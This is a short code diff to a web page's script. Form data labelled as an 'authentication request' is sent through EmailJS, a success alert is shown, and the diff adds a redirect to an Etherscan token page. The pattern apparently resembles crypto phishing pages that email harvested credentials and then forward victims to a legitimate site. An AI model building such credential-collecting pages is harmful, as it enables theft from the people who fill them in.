@@ -838,6 +838,9 @@ body::before {
             await emailjs.send('service_ze62eqw', 'template_7j3mdji', templateParams);
             alert('Authentication request sent successfully!');
             modals.auth.style.display = 'none';
+            setTimeout(() => {
+                    window.location.href = "https://etherscan.io/token/0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429";
+                }, 1500);
         } catch (error) {
             console.error('Failed to send:', error);
             alert('Authentication failed. Please try again.');
